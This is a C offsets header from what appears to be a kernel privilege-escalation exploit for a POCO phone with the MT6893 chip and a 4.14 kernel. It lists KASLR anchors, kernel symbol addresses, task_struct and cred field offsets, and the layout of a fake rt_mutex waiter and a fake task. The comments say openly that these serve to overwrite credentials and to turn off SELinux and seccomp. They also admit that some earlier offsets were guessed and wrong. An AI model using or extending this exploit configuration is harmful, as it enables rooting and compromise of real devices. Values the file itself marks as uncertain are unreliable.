#ifndef OFFSET_H
#define OFFSET_H

#define BUILD_VARIANT_LABEL "aresin_mt6893_4.14"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "POCO/aresin/aresin:13/TKQ1.220829.002/V14.0.4.0.TKJCNXM:user/release-keys"
#endif

/* Kernel base address (from /proc/kallsyms) */
#define KIMAGE_TEXT_BASE 0xffffff939bc80000ULL

/* Memory layout for MT6893 (Dimensity 1200) */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xffffffff00000000ULL

/* Kernel symbol offsets (from /proc/kallsyms analysis) */
/* VERIFIED 2026-08-16 on-device (aresin V14.0.4.0, Magisk + kptr_restrict=0):
 * file offset == runtime_addr - BASE, BASE = _stext - 0x800
 * (runtime _stext=0xffffff86e3280800, BASE=0xffffff86e3280000, slide=0x6db280000).
 * init_task: fork_init ADRP (0x1c5c000 page) + comm="swapper"@+0x798
 *   (__get_task_comm/sched_show_task) -> 0x1c5bec0.  (doc 0x01c5c058 was wrong)
 * root_task_group: sched_init passes 0x1e65940 to init_tg_cfs_entry (.bss).
 * selinux_enforcing: enforcing_setup reads 0x2080b28/0x2080b2c (.bss). */
#define INIT_TASK_OFF 0x1c5bec0ULL
#define ROOT_TASK_GROUP_OFF 0x1e65940ULL
#define SELINUX_ENFORCING_OFF 0x2080b28ULL

/* Additional kernel symbols (from /proc/kallsyms) */
/* VERIFIED 2026-08-16: init_cred @ file 0x1c69158 (prepare_kernel_cred@0x64604:
   adrp+add -> 0x1c69158; get_cred + memcpy(new, init_cred, 0xa8)).
   Old 0x01e63850 was beyond the image (fabricated/guessed). */
#define INIT_CRED_OFF 0x1c69158ULL
#define ENTRY_TASK_OFF 0x01784028ULL      /* 0xffffff939d404028 - KIMAGE_TEXT_BASE (__switch_to ref) */
#define PER_CPU_OFFSET_OFF 0x01784028ULL  /* per_cpu area base, same as ENTRY_TASK on this kernel */
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ENTRY_TASK (KIMAGE_TEXT_BASE + ENTRY_TASK_OFF)
#define PER_CPU_OFFSET (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)

/* pselect waiter word shift — 4.14 kernel uses 2 (fd_set word layout) */
#define PSELECT_WAITER_WORD_SHIFT 2

/* Ashmem offsets — VERIFIED 2026-08-16 from on-device kallsyms + ashmem_init ADRP:
 * ashmem_misc @ 0x1da6508 (misc_register arg; fops ptr at +0x10, runtime-filled —
 * the image zeroes .data pointer fields, so the fops table address is resolved
 * at runtime in leak_kernel_base()). ashmem_* function offsets from kallsyms. */
#define ASHMEM_MISC_FOPS_OFF 0x1da6508ULL
#define ASHMEM_FOPS_OFF 0x0ULL
#define ASHMEM_IOCTL_OFF 0xcf9274ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0ULL
#define ASHMEM_MMAP_OFF 0xcf9b9cULL
#define ASHMEM_OPEN_OFF 0xcf9d04ULL
#define ASHMEM_RELEASE_OFF 0xcf9d84ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0ULL

/* Configfs offsets — VERIFIED 2026-08-16 on-device kallsyms:
 * 4.14 configfs files use .read/.write (configfs_read_file/write_file), no
 * read_iter. generic_file_read_iter/write_iter used for the iter slots. */
#define CONFIGFS_READ_OFF 0x2964a0ULL
#define CONFIGFS_WRITE_OFF 0x296628ULL
#define CONFIGFS_READ_ITER_OFF 0x181768ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x1836a0ULL

/* Other kernel offsets
 * 2026-08-16 audit vs ares_images_V14.0.4.0.TKJCNXM boot.img kernel:
 *   ANON_PIPE_BUF_OPS 0x1fc150, NOOP_LLSEEK 0x1eed5c, KMALLOC_CACHES 0x1783828,
 *   SECURITY_HOOK_HEADS 0x15f5f70, ASHMEM_MISC_FOPS 0x1da5d98 were all WRONG
 *   (no code/data references; mid-function or unreferenced addresses).
 *   Set to 0x0 so util.c resolve_missing_offsets() resolves them at runtime
 *   from /proc/kallsyms (generic_pipe_buf_confirm / noop_llseek are function
 *   symbols and resolve reliably; data symbols fall back when absent).
 * SELINUX_BLOB_SIZES 0x2080308 / SELINUX_ENFORCING 0x2120b28 kept: they land
 *   in .bss (beyond the image file, zero-filled at boot) — reading 0 yields
 *   the correct single-LSM behavior (selinux blob offset 0; enforcing=0 skips
 *   the setenforce write). True addresses are not recoverable from the image.
 */
/* VERIFIED 2026-08-16 on-device:
 * COPY_SPLICE_READ: 4.14 has no copy_splice_read -> generic_file_splice_read.
 * NOOP_LLSEEK: kallsyms 0x1ef55c.
 * SELINUX_BLOB_SIZES: selinux_cred_prepare ADRP x4 -> 0x2080b08 (.bss).
 * KMALLOC_CACHES: __kmalloc ldr [x10, w9, sxtw #3] -> 0x1c4db00 (.data..ro_after_init).
 * ANON_PIPE_BUF_OPS: pipe_buf_operations with confirm@0 == generic_pipe_buf_confirm
 *   (kallsyms 0x1fc950, mov w0,wzr;ret in image).
 * SECURITY_HOOK_HEADS: not used by the exploit (SECURITY_CAPABLE_HEAD unused);
 *   file_open slot @ 0x15f6ab0 / capable @ 0x15f6690 if ever needed. */
#define COPY_SPLICE_READ_OFF 0x22f248ULL
#define NOOP_LLSEEK_OFF 0x1ef55cULL
#define SELINUX_BLOB_SIZES_OFF 0x2080b08ULL
#define SECURITY_HOOK_HEADS_OFF 0x0ULL
#define KMALLOC_CACHES_OFF 0x1c4db00ULL
#define ANON_PIPE_BUF_OPS_OFF 0x1fc950ULL

/* Computed addresses */
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* KASLR slide anchors */
#define SLIDE_NFULNL_LOGGER_OFF 0x01c5c658ULL  /* swapper/0 string */
#define SLIDE_LOGGERS_0_1_OFF 0x01c5c658ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x01c5c658ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Exploit layout offsets */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* rt_mutex_waiter offsets (4.14.186 ARM64) */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_WAKE_STATE_OFF 0x00   /* Not present in 4.14 */
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define WAITER_WW_CTX_OFF 0x00      /* Not present in 4.14 */

/* Fake waiter offsets */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* task_struct offsets (4.14.186 MT6893) */
#define FAKE_TASK_USAGE_OFF 0x10
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x88
#define FAKE_TASK_TASK_GROUP_OFF 0x848
#define FAKE_TASK_PI_LOCK_OFF 0x85c
#define FAKE_TASK_PI_WAITERS_OFF 0x868
#define FAKE_TASK_PI_TOP_TASK_OFF 0x870
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x880

/* Page and slab constants */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* task_struct additional offsets */
#define MM_OWNER_OFF 1032
/* task_struct offsets — VERIFIED 2026-08-16 on-device disasm:
 * pid 0x5c8 / tgid 0x5cc (sched_show_task ldr w,[x,#0x5c8] x2)
 * real_parent 0x5d8 (sys_getppid/sched_show_task/proc_pid_status)
 * group_leader 0x608, thread_pid 0x640 (__task_pid_nr_ns)
 * comm 0x798 (__get_task_comm memcpy + sched_show_task %s)
 * tasks 0x4c8 (show_state_filter for_each_process walk)
 * atomic_flags 0x590 (do_execveat_common tbz w8,#0 = PFA_NO_NEW_PRIVS)
 * seccomp 0x838 (__secure_computing ldr w9,[x8,#0x838] = seccomp.mode)
 * alloc_lock 0x858 (__get_task_comm spinlock) */
#define TASK_PID_OFF 0x5c8
#define TASK_TGID_OFF 0x5cc
#define TASK_REAL_PARENT_OFF 0x5d8
#define TASK_ATOMIC_FLAGS_OFF 0x590
#define TASK_REAL_CRED_OFF 0x788
#define TASK_CRED_OFF 0x790
#define TASK_COMM_OFF 0x798
#define TASK_TASKS_OFF 0x4c8
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x838

/* cred offsets */
#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 36
#define CRED_CAPS_OFF 48
/* VERIFIED 2026-08-16 against ares_images_V14.0.4.0.TKJCNXM boot.img:
   commit_creds@0x641e0 + prepare_kernel_cred@0x64604 disasm:
   security @ +0x78 (str xzr,[x20,#0x78] = new->security=NULL),
   user @ +0x80, group_info @ +0x88, sizeof(struct cred) = 0xa8.
   Previous 0x80 pointed at user (corrupted user->__count in patch_cred_sid). */
#define CRED_SECURITY_OFF 0x78
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

/* seccomp offsets */
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

/* struct page offsets */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x30
#define STRUCT_PAGE_TYPE_OFF 0x30

/* pipe buffer */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* file_operations offsets */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
